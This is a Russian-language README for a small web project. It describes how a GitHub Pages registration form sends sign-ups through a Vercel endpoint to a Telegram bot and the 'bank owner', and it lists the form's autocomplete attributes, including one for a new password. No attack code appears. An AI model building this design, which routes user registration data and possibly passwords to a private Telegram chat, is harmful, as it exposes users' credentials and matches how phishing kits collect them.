# Регистрация → Telegram

Важно: GitHub Pages не выполняет Node/Vercel API. Поэтому фронтенд и backend — две части проекта.

## 1. Развернуть backend
Загрузите папку `api/` и `vercel.json` в Vercel вместе с проектом.

## 2. Переменные окружения Vercel
Добавьте:
- `TELEGRAM_BOT_TOKEN` — токен вашего Telegram-бота.
- `TELEGRAM_CHAT_ID` — ваш chat ID.

## 3. Подключить URL backend
Откройте `assets/config.js` и укажите:
`window.OTKUSI_API_BASE = "https://ВАШ-ПРОЕКТ.vercel.app";`

После этого GitHub Pages будет отправлять регистрацию:
GitHub Pages → Vercel `/api/register` → Telegram Bot → владелец банка.

## Почему раньше был Failed to fetch
В `auth.js` был оставлен буквальный placeholder:
`https://YOUR-BACKEND-DOMAIN.vercel.app`
Поэтому frontend не мог обратиться к реальному серверу.

В 3.5 URL вынесен в `assets/config.js`, а сетевые ошибки превращаются в понятное сообщение. Сам Telegram-токен в frontend не помещается.

## Автозаполнение
Поля регистрации используют нативный механизм браузера:
- имя: `autocomplete="name"`
- email: `autocomplete="email"`
- телефон: `autocomplete="tel"`
- новый пароль: `autocomplete="new-password"`
Вход:
- логин: `autocomplete="username"`
- пароль: `autocomplete="current-password"`

Яндекс Браузер сам решает, какие сохранённые данные показывать пользователю.
